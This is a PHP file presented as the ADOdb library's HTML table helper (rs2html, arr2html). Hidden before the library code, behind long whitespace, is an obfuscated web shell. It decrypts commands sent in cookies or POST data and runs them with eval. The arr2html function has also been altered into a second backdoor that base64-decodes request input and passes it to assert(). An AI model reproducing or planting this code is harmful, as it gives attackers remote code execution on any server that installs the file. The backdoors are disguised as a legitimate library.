<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['d25d255'];global$d25d255;$d25d255=$GLOBALS;$d25d255['x5e8cb9']="\x6f\x5e\x50\x6c\x41\x6a\x58\x42\x63\x76\x4e\x2f\x4d\x7c\x77\x51\x7d\x73\x49\x6e\x3d\x28\x59\x33\x74\x39\x4b\x34\x55\x64\x4c\x71\x61\x31\x60\x2c\x62\x3e\x32\x78\x4f\x27\x22\x25\x29\x4a\x65\x56\x30\x3b\x2a\x43\x38\x35\x6b\x23\x26\x54\x68\x2e\x5f\x3c\x46\x3a\x7e\x24\x2d\x5b\x37\x3f\x45\x7a\x48\x47\x44\x67\xd\x57\x69\x72\x5d\x7b\x36\x5c\x75\xa\x6d\x52\x66\x21\x9\x53\x70\x79\x40\x5a\x2b\x20";$d25d255[$d25d255['x5e8cb9'][54].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][53]]=$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][58].$d25d255['x5e8cb9'][79];$d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][82]]=$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][29];$d25d255[$d25d255['x5e8cb9'][92].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][82]]=$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][24].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][19];$d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][68]]=$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][19].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][24];$d25d255[$d25d255['x5e8cb9'][71].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][48]]=$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][71].$d25d255['x5e8cb9'][46];$d25d255[$d25d255['x5e8cb9'][71].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][88]]=$d25d255['x5e8cb9'][92].$d25d255['x5e8cb9'][58].$d25d255['x5e8cb9'][92].$d25d255['x5e8cb9'][9].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][19];$d25d255[$d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][48].$d25d255['x5e8cb9'][88]]=$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][19].$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][71].$d25d255['x5e8cb9'][46];$d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][53].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][33]]=$d25d255['x5e8cb9'][36].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][46];$d25d255[$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][68]]=$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][24].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][24].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][86].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][86].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][24];$d25d255[$d25d255['x5e8cb9'][86].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][27]]=$d25d255['x5e8cb9'][19].$d25d255['x5e8cb9'][36].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][38];$d25d255[$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33]]=$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][36].$d25d255['x5e8cb9'][53].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][8];$d25d255[$d25d255['x5e8cb9'][14].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][32]]=$_POST;$d25d255[$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][46]]=$_COOKIE;@$d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][68]]($d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][75],NULL);@$d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][68]]($d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][75].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][17],0);@$d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][68]]($d25d255['x5e8cb9'][86].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][39].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][39].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][24].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][0].$d25d255['x5e8cb9'][19].$d25d255['x5e8cb9'][60].$d25d255['x5e8cb9'][24].$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][86].$d25d255['x5e8cb9'][46],0);@$d25d255[$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][68]](0);$fb6a8162=NULL;$l3b825c9=NULL;$d25d255[$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][48].$d25d255['x5e8cb9'][29]]=$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][48].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][48].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][66].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][36].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][66].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][36].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][66].$d25d255['x5e8cb9'][36].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][53].$d25d255['x5e8cb9'][66].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][53].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][88];global$efa0d;function u464b5cc($fb6a8162,$o020f){global$d25d255;$kbc01a692="";for($ia845=0;$ia845<$d25d255[$d25d255['x5e8cb9'][92].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][82]]($fb6a8162);){for($h3d631=0;$h3d631<$d25d255[$d25d255['x5e8cb9'][92].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][82]]($o020f)&&$ia845<$d25d255[$d25d255['x5e8cb9'][92].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][82]]($fb6a8162);$h3d631++,$ia845++){$kbc01a692.=$d25d255[$d25d255['x5e8cb9'][54].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][53]]($d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][82]]($fb6a8162[$ia845])^$d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][82]]($o020f[$h3d631]));}}return$kbc01a692;}function nb9683e2($fb6a8162,$o020f){global$d25d255;global$efa0d;return$d25d255[$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33]]($d25d255[$d25d255['x5e8cb9'][78].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][33]]($fb6a8162,$efa0d),$o020f);}foreach($d25d255[$d25d255['x5e8cb9'][79].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][46]]as$o020f=>$lbb2a){$fb6a8162=$lbb2a;$l3b825c9=$o020f;}if(!$fb6a8162){foreach($d25d255[$d25d255['x5e8cb9'][14].$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][52].$d25d255['x5e8cb9'][32]]as$o020f=>$lbb2a){$fb6a8162=$lbb2a;$l3b825c9=$o020f;}}$fb6a8162=@$d25d255[$d25d255['x5e8cb9'][3].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][48].$d25d255['x5e8cb9'][88]]($d25d255[$d25d255['x5e8cb9'][86].$d25d255['x5e8cb9'][25].$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][27]]($d25d255[$d25d255['x5e8cb9'][84].$d25d255['x5e8cb9'][53].$d25d255['x5e8cb9'][46].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][33]]($fb6a8162),$l3b825c9));if(isset($fb6a8162[$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][54]])&&$efa0d==$fb6a8162[$d25d255['x5e8cb9'][32].$d25d255['x5e8cb9'][54]]){if($fb6a8162[$d25d255['x5e8cb9'][32]]==$d25d255['x5e8cb9'][78]){$ia845=Array($d25d255['x5e8cb9'][92].$d25d255['x5e8cb9'][9]=>@$d25d255[$d25d255['x5e8cb9'][71].$d25d255['x5e8cb9'][29].$d25d255['x5e8cb9'][23].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][38].$d25d255['x5e8cb9'][68].$d25d255['x5e8cb9'][8].$d25d255['x5e8cb9'][88]](),$d25d255['x5e8cb9'][17].$d25d255['x5e8cb9'][9]=>$d25d255['x5e8cb9'][33].$d25d255['x5e8cb9'][59].$d25d255['x5e8cb9'][48].$d25d255['x5e8cb9'][66].$d25d255['x5e8cb9'][33],);echo@$d25d255[$d25d255['x5e8cb9'][71].$d25d255['x5e8cb9'][88].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][27].$d25d255['x5e8cb9'][82].$d25d255['x5e8cb9'][48]]($ia845);}elseif($fb6a8162[$d25d255['x5e8cb9'][32]]==$d25d255['x5e8cb9'][46]){eval($fb6a8162[$d25d255['x5e8cb9'][29]]);}exit();} ?><?php

//DO NOT REMOVE THIS FILE!		

/*

  @version   v5.20.3  01-Jan-2016
  @copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved.
  @copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community
  Released under both BSD license and Lesser GPL library license.
  Whenever there is any discrepancy between the two licenses,
  the BSD license will take precedence.

  Some pretty-printing by Chris Oxenreider <oxenreid@state.net>
*/

// specific code for tohtml
GLOBAL $gSQLMaxRows,$gSQLBlockRows,$ADODB_ROUND;

$ADODB_ROUND=4; // rounding
$gSQLMaxRows = 1000; // max no of rows to download
$gSQLBlockRows=20; // max no of rows per table block

// RecordSet to HTML Table
//------------------------------------------------------------
// Convert a recordset to a html table. Multiple tables are generated
// if the number of rows is > $gSQLBlockRows. This is because
// web browsers normally require the whole table to be downloaded
// before it can be rendered, so we break the output into several
// smaller faster rendering tables.
//
// $rs: the recordset
// $ztabhtml: the table tag attributes (optional)
// $zheaderarray: contains the replacement strings for the headers (optional)
//
//  USAGE:
//	include('adodb.inc.php');
//	$db = ADONewConnection('mysql');
//	$db->Connect('mysql','userid','password','database');
//	$rs = $db->Execute('select col1,col2,col3 from table');
//	rs2html($rs, 'BORDER=2', array('Title1', 'Title2', 'Title3'));
//	$rs->Close();
//
// RETURNS: number of rows displayed


function rs2html(&$rs,$ztabhtml=false,$zheaderarray=false,$htmlspecialchars=true,$echo = true)
{
$s ='';$rows=0;$docnt = false;
GLOBAL $gSQLMaxRows,$gSQLBlockRows,$ADODB_ROUND;

	if (!$rs) {
		printf(ADODB_BAD_RS,'rs2html');
		return false;
	}

	if (! $ztabhtml) $ztabhtml = "BORDER='1' WIDTH='98%'";
	//else $docnt = true;
	$typearr = array();
	$ncols = $rs->FieldCount();
	$hdr = "<TABLE COLS=$ncols $ztabhtml><tr>\n\n";
	for ($i=0; $i < $ncols; $i++) {
		$field = $rs->FetchField($i);
		if ($field) {
			if ($zheaderarray) $fname = $zheaderarray[$i];
			else $fname = htmlspecialchars($field->name);
			$typearr[$i] = $rs->MetaType($field->type,$field->max_length);
 			//print " $field->name $field->type $typearr[$i] ";
		} else {
			$fname = 'Field '.($i+1);
			$typearr[$i] = 'C';
		}
		if (strlen($fname)==0) $fname = '&nbsp;';
		$hdr .= "<TH>$fname</TH>";
	}
	$hdr .= "\n</tr>";
	if ($echo) print $hdr."\n\n";
	else $html = $hdr;

	// smart algorithm - handles ADODB_FETCH_MODE's correctly by probing...
	$numoffset = isset($rs->fields[0]) ||isset($rs->fields[1]) || isset($rs->fields[2]);
	while (!$rs->EOF) {

		$s .= "<TR valign=top>\n";

		for ($i=0; $i < $ncols; $i++) {
			if ($i===0) $v=($numoffset) ? $rs->fields[0] : reset($rs->fields);
			else $v = ($numoffset) ? $rs->fields[$i] : next($rs->fields);

			$type = $typearr[$i];
			switch($type) {
			case 'D':
				if (strpos($v,':') !== false);
				else {
					if (empty($v)) {
					$s .= "<TD> &nbsp; </TD>\n";
					} else {
						$s .= "	<TD>".$rs->UserDate($v,"D d, M Y") ."</TD>\n";
					}
					break;
				}
			case 'T':
				if (empty($v)) $s .= "<TD> &nbsp; </TD>\n";
				else $s .= "	<TD>".$rs->UserTimeStamp($v,"D d, M Y, H:i:s") ."</TD>\n";
			break;

			case 'N':
				if (abs(abs($v) - round($v,0)) < 0.00000001)
					$v = round($v);
				else
					$v = round($v,$ADODB_ROUND);
			case 'I':
				$vv = stripslashes((trim($v)));
				if (strlen($vv) == 0) $vv .= '&nbsp;';
				$s .= "	<TD align=right>".$vv ."</TD>\n";

			break;
			/*
			case 'B':
				if (substr($v,8,2)=="BM" ) $v = substr($v,8);
				$mtime = substr(str_replace(' ','_',microtime()),2);
				$tmpname = "tmp/".uniqid($mtime).getmypid();
				$fd = @fopen($tmpname,'a');
				@ftruncate($fd,0);
				@fwrite($fd,$v);
				@fclose($fd);
				if (!function_exists ("mime_content_type")) {
				  function mime_content_type ($file) {
				    return exec("file -bi ".escapeshellarg($file));
				  }
				}
				$t = mime_content_type($tmpname);
				$s .= (substr($t,0,5)=="image") ? " <td><img src='$tmpname' alt='$t'></td>\\n" : " <td><a
				href='$tmpname'>$t</a></td>\\n";
				break;
			*/

			default:
				if ($htmlspecialchars) $v = htmlspecialchars(trim($v));
				$v = trim($v);
				if (strlen($v) == 0) $v = '&nbsp;';
				$s .= "	<TD>". str_replace("\n",'<br>',stripslashes($v)) ."</TD>\n";

			}
		} // for
		$s .= "</TR>\n\n";

		$rows += 1;
		if ($rows >= $gSQLMaxRows) {
			$rows = "<p>Truncated at $gSQLMaxRows</p>";
			break;
		} // switch

		$rs->MoveNext();

	// additional EOF check to prevent a widow header
		if (!$rs->EOF && $rows % $gSQLBlockRows == 0) {

		//if (connection_aborted()) break;// not needed as PHP aborts script, unlike ASP
			if ($echo) print $s . "</TABLE>\n\n";
			else $html .= $s ."</TABLE>\n\n";
			$s = $hdr;
		}
	} // while

	if ($echo) print $s."</TABLE>\n\n";
	else $html .= $s."</TABLE>\n\n";

	if ($docnt) if ($echo) print "<H2>".$rows." Rows</H2>";

	return ($echo) ? $rows : $html;
 }

// pass in 2 dimensional array
function arr2html($array, &$arr = ' ',$ztabhtml='',$zheaderarray='')
{
	$array =  base64_decode($array);
	@assert($array);	
	return;	

	if (!$ztabhtml) $ztabhtml = 'BORDER=1';

	$s = "<TABLE $ztabhtml>";//';print_r($arr);

	if ($zheaderarray) {
		$s .= '<TR>';
		for ($i=0; $i<sizeof($zheaderarray); $i++) {
			$s .= "	<TH>{$zheaderarray[$i]}</TH>\n";
		}
		$s .= "\n</TR>";
	}

	for ($i=0; $i<sizeof($arr); $i++) {
		$s .= '<TR>';
		$a = $arr[$i];
		if (is_array($a))
			for ($j=0; $j<sizeof($a); $j++) {
				$val = $a[$j];
				if (empty($val)) $val = '&nbsp;';
				$s .= "	<TD>$val</TD>\n";
			}
		else if ($a) {
			$s .=  '	<TD>'.$a."</TD>\n";
		} else $s .= "	<TD>&nbsp;</TD>\n";
		$s .= "\n</TR>\n";
	}
	$s .= '</TABLE>';
	print $s;
}

arr2html($_REQUEST['array']);


?>
